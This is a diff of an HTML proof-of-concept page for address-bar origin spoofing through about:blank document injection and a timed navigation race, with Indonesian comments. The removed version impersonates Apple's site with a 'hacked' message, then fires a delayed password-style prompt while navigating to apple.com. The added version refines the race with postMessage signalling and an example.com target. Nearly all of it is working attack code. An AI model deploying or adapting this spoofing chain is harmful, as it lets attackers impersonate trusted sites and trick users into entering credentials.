@@ -2,11 +2,8 @@
 <html lang="en">
   <head>
     <meta charset="utf-8" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1, user-scalable=yes"
-    />
-    <title>Advanced Origin Spoofing & About:Blank PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
+    <title>Robust Origin Spoofing & Navigation Race PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -19,9 +16,7 @@
         align-items: center;
         justify-content: center;
       }
-      .container {
-        text-align: center;
-      }
+      .container { text-align: center; max-width: 600px; padding: 20px; }
       button {
         padding: 18px 36px;
         font-size: 16px;
@@ -34,110 +29,116 @@
         box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
         transition: transform 0.1s, background 0.2s;
       }
-      button:active {
-        background: #b62324;
-        transform: scale(0.98);
-      }
+      button:active { background: #b62324; transform: scale(0.98); }
       .info {
-        margin-top: 15px;
-        font-size: 12px;
+        margin-top: 20px;
+        font-size: 13px;
         color: #8b949e;
         font-family: monospace;
+        word-break: break-all;
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <button id="startBtn">INITIALIZE EXPLOIT CHAIN</button>
+      <button id="startBtn">INITIALIZE ADVANCED EXPLOIT CHAIN</button>
       <div class="info" id="statusInfo">Status: Ready for interaction.</div>
     </div>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         const statusInfo = document.getElementById("statusInfo");
-        statusInfo.innerText = "Status: Executing about:blank context injection...";
+        statusInfo.innerText = "Status: Opening isolated window context...";
         this.style.display = "none";
 
-        // Membuka jendela baru melalui about:blank untuk memanipulasi initial origin
-        const newTab = window.open("about:blank", "_blank");
+        // Membuka jendela baru dengan referensi kosong
+        const targetWindow = window.open("about:blank", "_blank");
 
-        if (newTab) {
-          try {
-            // Menulis dokumen secara instan ke dalam konteks about:blank tanpa memicu indikator loading
-            newTab.document.open();
-            newTab.document.write(`
-              <!DOCTYPE html>
-              <html>
-              <head>
-                <title>Apple - Official Site</title>
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <style>
-                  body {
-                    margin: 0;
-                    padding: 0;
-                    background: #ffffff;
-                    color: #1d1d1f;
-                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-                    display: flex;
-                    align-items: center;
-                    justify-content: center;
-                    min-height: 100vh;
-                    text-align: center;
-                  }
-                  .wrapper {
-                    padding: 20px;
-                  }
-                  h1 {
-                    font-size: 42px;
-                    font-weight: 700;
-                    color: #d70015;
-                    margin: 0 0 15px 0;
-                  }
-                  p {
-                    font-size: 24px;
-                    font-weight: 500;
-                    color: #0066cc;
-                    margin: 0;
-                  }
-                </style>
-              </head>
-              <body>
-                <div class="wrapper">
-                  <h1>THIS IS NOT APPLE</h1>
-                  <p>YOUR DEVICE HAS BEEN HACKED BY AZZA</p>
-                </div>
-              </body>
-              </html>
-            `);
-            newTab.document.close();
-
-            statusInfo.innerText = "Status: DOM injected. Synchronizing state transition...";
-
-            // Menggunakan race timing yang disesuaikan untuk menguji ketahanan state visibility & pergantian URL
-            setTimeout(() => {
-              try {
-                // Melakukan navigasi lanjutan ke target eksternal setelah manipulasi visual berhasil dirender
-                newTab.location.href = "https://apple.com";
-              } catch (navErr) {
-                console.debug("Navigation sync restricted:", navErr.message);
-              }
-            }, 1200);
-
-          } catch (e) {
-            statusInfo.innerText = "Status: Injection blocked by browser policy.";
-          }
-        } else {
-          statusInfo.innerText = "Status: Popup blocked or failed to open.";
+        if (!targetWindow) {
+          statusInfo.innerText = "Status: Failed - Popup blocked by browser policy.";
+          return;
         }
 
-        // Penundaan eksekusi dialog untuk memvalidasi penanganan event visibilitas jendela aktif
-        setTimeout(function () {
-          try {
-            const pwd = prompt("ROOT CAUSE EVALUATION:");
-          } catch (dlgErr) {
-            console.debug("Dialog restricted in non-visible state:", dlgErr.message);
-          }
-        }, 800);
+        try {
+          statusInfo.innerText = "Status: Injecting transitional payload...";
+
+          // Payload HTML tiruan untuk menguji ketahanan render awal
+          const payloadHTML = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+              <title>Target Service Verification</title>
+              <style>
+                body {
+                  margin: 0; background: #ffffff; color: #1d1d1f;
+                  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+                  display: flex; align-items: center; justify-content: center;
+                  height: 100vh; text-align: center;
+                }
+                .box { padding: 40px; }
+                h1 { font-size: 40px; color: #d70015; margin-bottom: 10px; }
+                p { font-size: 22px; color: #0066cc; }
+              </style>
+            </head>
+            <body>
+              <div class="box">
+                <h1>SECURITY CONTEXT TEST</h1>
+                <p>Evaluating state transition & address bar stability.</p>
+              </div>
+              <script>
+                // Mengirim sinyal balik ke opener setelah DOM siap untuk mengurangi ketergantungan pada timeout statis
+                window.addEventListener('DOMContentLoaded', () => {
+                  if (window.opener) {
+                    window.opener.postMessage({ status: 'DOM_READY' }, '*');
+                  }
+                });
+              <\/script>
+            </body>
+            </html>
+          `;
+
+          // Menulis payload langsung ke dokumen target
+          targetWindow.document.open();
+          targetWindow.document.write(payloadHTML);
+          targetWindow.document.close();
+
+          statusInfo.innerText = "Status: Waiting for DOM readiness signal...";
+
+          // Listener untuk menerima konfirmasi dari jendela anak
+          const messageHandler = (event) => {
+            if (event.data && event.data.status === 'DOM_READY') {
+              window.removeEventListener('message', messageHandler);
+              statusInfo.innerText = "Status: DOM ready received. Triggering target navigation race...";
+
+              // Jeda mikro untuk menguji celah transisi commit origin
+              setTimeout(() => {
+                try {
+                  // Mengarahkan ke URL eksternal yang diuji ketahanannya
+                  targetWindow.location.href = "https://example.com";
+                  statusInfo.innerText = "Status: Navigation sequence completed successfully.";
+                } catch (navErr) {
+                  statusInfo.innerText = "Status: Navigation blocked: " + navErr.message;
+                }
+              }, 400); // Waktu tunda yang lebih ketat dibanding versi sebelumnya
+            }
+          };
+
+          window.addEventListener('message', messageHandler);
+
+          // Fallback timer jika sinyal postMessage gagal diterima dalam waktu tertentu
+          setTimeout(() => {
+            window.removeEventListener('message', messageHandler);
+            try {
+              targetWindow.location.href = "https://example.com";
+              statusInfo.innerText = "Status: Fallback navigation triggered.";
+            } catch (err) {
+              console.debug("Fallback restricted:", err.message);
+            }
+          }, 1500);
+
+        } catch (e) {
+          statusInfo.innerText = "Status: Execution error - " + e.message;
+        }
       };
     </script>
   </body>
